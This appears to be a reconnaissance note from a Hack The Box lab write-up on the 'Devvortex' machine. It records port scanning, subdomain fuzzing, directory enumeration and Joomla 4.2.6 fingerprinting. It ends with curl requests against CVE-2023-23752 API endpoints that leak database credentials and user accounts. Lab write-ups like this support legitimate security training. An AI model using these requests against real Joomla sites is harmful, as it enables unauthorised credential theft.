# Devvortex — Reconnaissance

## Target Summary

| Field | Value |
|-------|-------|
| **IP** | 10.129.190.60 |
| **Hostname** | devvortex.htb / dev.devvortex.htb |
| **OS** | Linux (Ubuntu) |
| **Difficulty** | Easy |
| **Ports** | 22 (SSH), 80 (HTTP) |

---

## Phase 1 — Port Scan

```bash
nmap -sC -sV -Pn -oN raw_data/nmap.initial 10.129.190.60
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devvortex.htb/
```

**Key observation:** Port 80 redirects to `devvortex.htb` — need vhost enumeration to find hidden content.

---

## Phase 2 — VHost Enumeration

The main site (`devvortex.htb`) is a generic marketing page. Hidden content lives on a subdomain.

### Subdomain Discovery (ffuf)
```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ \
  -u http://devvortex.htb \
  -H "Host: FUZZ.devvortex.htb" \
  -fw 4 -t 100
```

| VHost | Status | Size | Notes |
|-------|--------|------|-------|
| devvortex.htb | 200 | ~18000 | Decoy marketing site |
| **dev.devvortex.htb** | **200** | **23221** | **Real CMS target** |

### Directory Scan (main site — low yield)
```bash
gobuster dir -u http://devvortex.htb \
  -w /usr/share/wordlists/dirb/common.txt -t 50
# Found: /css/, /images/, /js/, /index.html
```

### Directory Scan (dev subdomain — CMS files)
```bash
gobuster dir -u http://dev.devvortex.htb \
  -w /usr/share/wordlists/dirb/common.txt -t 50
# Found: /administrator/ (Joomla admin panel)
```

---

## Phase 3 — CMS Identification

### Fingerprinting via HTTP Requests

```bash
# Check administrator manifest for version
curl -s "http://dev.devvortex.htb/administrator/manifests/files/joomla.xml" | grep -oP '(?<=<version>)[^<]+'
# Output: 4.2.6

# Language metadata also exposes version
curl -s "http://dev.devvortex.htb/language/en-GB/langmetadata.xml" | grep -oP '(?<=<version>)[^<]+'
```

### Version Confirmation
| Indicator | Value |
|-----------|-------|
| **CMS** | Joomla |
| **Version** | **4.2.6** |
| **Template** | Cassiopeia (Joomla 4.x default) |
| **Admin URL** | `http://dev.devvortex.htb/administrator/` |

**Critical context:** 4.0.0 ≤ 4.2.6 ≤ 4.2.7 → **VULNERABLE to CVE-2023-23752**

---

## Phase 4 — Environment Setup

Add to `/etc/hosts`:
```
10.129.190.60  dev.devvortex.htb
```

**Access URLs:**
| URL | Purpose |
|-----|---------|
| `http://dev.devvortex.htb/` | Frontend |
| `http://dev.devvortex.htb/administrator/` | Admin login |

---

## Phase 5 — Exploitation Preparation

With Joomla 4.2.6 confirmed, the next step is CVE-2023-23752 exploitation.

**Target endpoints (CVE-2023-23752):**
| Endpoint | Data Exposed |
|----------|-------------|
| `/api/index.php/v1/config/application?public=true` | Database credentials |
| `/api/index.php/v1/users?public=true` | User accounts and groups |

**See:** [exploit.md](exploit.md) for full exploitation procedure.

---

## Quick Reference

```bash
# Recon commands used on Devvortex
nmap -sC -sV -Pn 10.129.190.60
ffuf -w wordlist.txt:FUZZ -u http://devvortex.htb -H "Host: FUZZ.devvortex.htb" -fw 4
curl -s "http://dev.devvortex.htb/administrator/manifests/files/joomla.xml" | grep -oP '(?<=<version>)[^<]+'
curl -s "http://dev.devvortex.htb/api/index.php/v1/config/application?public=true" -H "Accept: application/vnd.api+json"
curl -s "http://dev.devvortex.htb/api/index.php/v1/users?public=true" -H "Accept: application/vnd.api+json"
```

## Checklist

- [x] Port scan (22, 80 open)
- [x] Identify HTTP redirect to devvortex.htb
- [x] Discover `dev.devvortex.htb` subdomain
- [x] Identify CMS: Joomla 4.2.6
- [x] Confirm CVE-2023-23752 applicability
- [ ] **→ Move to** [exploit.md](exploit.md)
- [ ] **→ Full writeup:** [devvortex-writeup.md](../../writeups/devvortex-writeup.md)
